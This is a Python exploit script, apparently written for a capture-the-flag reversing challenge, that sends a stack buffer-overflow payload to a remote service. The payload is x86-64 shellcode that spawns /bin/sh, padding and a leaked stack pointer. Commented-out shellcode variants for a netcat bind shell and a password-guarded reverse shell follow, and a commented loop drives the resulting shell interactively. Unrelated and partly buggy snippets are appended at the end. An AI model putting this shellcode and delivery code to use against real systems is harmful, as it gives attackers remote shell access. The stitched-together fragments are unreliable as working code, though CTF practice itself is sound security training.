import socket
import select
import time
import subprocess
from struct import pack, unpack


def get_padding(shellcode, buff_size):
    shell_len = len(shellcode)
    padd_len = buff_size - shell_len
    if padd_len < 0:
        raise ValueError('Shellcode too long.')
    return b"\x00" * padd_len

def build_binary(sp):
    buff_size = 200
    #open port for netcat
    #shellcode = b"\x48\x31\xd2\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\x51\x48\x89\xe1\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\x48\xc1\xeb\x30\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33\x33\x37\x49\xc1\xea\x20\x41\x52\x49\x89\xe2\x49\xb9\xff\xff\xff\xff\xff\xff\x2d\x70\x49\xc1\xe9\x30\x41\x51\x49\x89\xe1\x49\xb8\xff\xff\xff\xff\xff\xff\x2d\x6c\x49\xc1\xe8\x30\x41\x50\x49\x89\xe0\x52\x51\x53\x41\x52\x41\x51\x41\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
    #shellcode = b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x48\x97\x48\x31\xc0\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x11\x5c\xc6\x44\x24\xf8\x02\x48\x83\xec\x08\x6a\x31\x58\x48\x89\xe6\x99\x80\xc2\x10\x0f\x05\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x48\x83\xec\x10\x48\x31\xf6\x48\x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x99\x48\x89\xe2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x88\x44\x24\xff\x48\x83\xec\x01\x99\x52\x48\x8d\x74\x24\xf0\x80\xc2\x10\x0f\x05\x48\xb8\x64\x6f\x6f\x6d\x65\x64\x72\x61\x57\x48\x8d\x3e\x48\xaf\x74\x07\x48\x31\xc0\x04\x3c\x0f\x05\x5f\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x56\x48\x89\xe2\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05"
    #shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    #Reverse Shell
    #shellcode = b'\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x87\xd3\x0f\x05\x48\x97\x48\x31\xc0\x48\x83\xec\x08\x6a\x31\x58\x48\x89\xe6\x6a\x10\x5a\x0f\x05\x6a\x32\x58\x6a\x02\x5e\x0f\x05\x6a\x2b\x58\x48\x83\xec\x10\x48\x89\xe6\x6a\x10\x48\x89\xe2\x0f\x05\x49\x89\xc1\x6a\x03\x58\x0f\x05\x4c\x87\xcf\x48\x31\xf6\x6a\x21\x58\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\xe0\xf2\x48\x31\xc0\x6a\x10\x5a\x48\x83\xec\x10\x48\x89\xe6\x31\xff\x0f\x05\x48\xb8\x50\x61\x73\x73\x77\x6f\x72\x64\x48\xaf\x74\x05\x6a\x3c\x58\x0f\x05\x48\x31\xc0\x48\x89\xc2\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05'
    #run /bin/sh
    shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    binary = b'\x00'*5*16
    binary += shellcode
    binary += get_padding(binary, buff_size)
    binary += sp
    return binary

def get_recv(s, line_feed=b'\n'):
    out = []
    while True:
        try:
            n = s.recv(1)
        except socket.timeout:
            n = line_feed
        print(n)
        if n == line_feed:
            break
        out.append(bytes(n))
    out.append('\n')
    return "".join(out)

def myrecv(s):
    line_feed = b'<EOF>\n'
    result = []
    response = ''
    while not response == line_feed:
        if response:
            print(response)
            result.append(response)
        response = get_recv(s, line_feed)
    return result


def start_bin(filename):
    return subprocess.Popen([filename], stdin=subprocess.PIPE, stdout=subprocess.PIPE, bufsize=0)
    #return subprocess.Popen([filename], bufsize=0)

if __name__ == '__main__':

    local = False
    timeout = 3

    if local:
        p = start_bin('/media/sf_Kali_Shared/Darknet/Reversing8/8_gotime')
        try:
            print('Process Started!')
            #print(p.stdout.readline())
            print('Sending init flag 0x01')
            p.stdin.write(b'\x01\n')
            p.stdin.flush()
            print('getting output')
            out = []
            for i in range(120):
                out.append(bytes(p.stdout.read(1)))
            sp = "".join(out[16:24])
            buff = "".join(out[:120])
            binary = build_binary(sp)
            p.stdin.write(b'\x02\n')
            p.stdin.flush()
            p.stdin.write(binary)
            p.stdin.flush()
            out = []
            try:
                print('getting stdout')
                while True:
                    out.append(bytes(p.stdout.read(1)))
                    print(out[-1])
            except KeyboardInterrupt:
                pass
            print(out)
            print("".join(out))

            print('OUT')
            
            #print(p.stdout.readline())
        except:
            if p.poll() is None:
                p.kill()
            raise
        finally:
            if p.poll() is None:
                p.kill()
    else:
        hostname = 'gibson.systems'
        port = 32132

        print('Attempting to establish socket...')
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((hostname, port))
        print('Socket established.')
        s.send(b'\x01\n')
        print('hoping for response')
        response = myrecv(s)
        print('Sending exploit')
        s.send(b'\x02\n')
        time.sleep(.5)
        s.send(binary)
        print('sending termination flag')
        s.send(b'\x03')
        print(myrecv(s))
        print('done')

        '''
        while True:
            command = input() + '\n'
            s.send(command.encode('utf-8'))
            s.send(b'echo END\n')
            myrecv(s)
        '''


def next_bigger(n):
    str_n = str(n)
    rev = reversed(str_n)
    for i, num in enumerate(rev):
        if sorted(str_n[:-i - 1]) == list(str_n[:-i - 1]):
            print(sorted(str_n[:-i - 1]))
            print(list(str_n[:-i - 1]))
            continue
        next_high = None
        searchable = sorted(set(str_n[-i - 1:]))
        print('searchable')
        print(searchable)
        for x in searchable:
            print(x)
            print(num)
            if x > num:
                next_high = x
        print('next high')
        print(next_high)
        f = list(str_n[-i - 1:])
        f.remove(x)
        end_num = "".join(sorted(f))
        new_num = str_n[:-i - 1] + next_high + end_num
        return new_num
    return -1


for row in reversed(range(5)):
    new = []
    for num in reversed(range(row)):
        new.append(num + 1)
        if num == row:
            continue
        new.insert(0, num + 1)
    print(new)
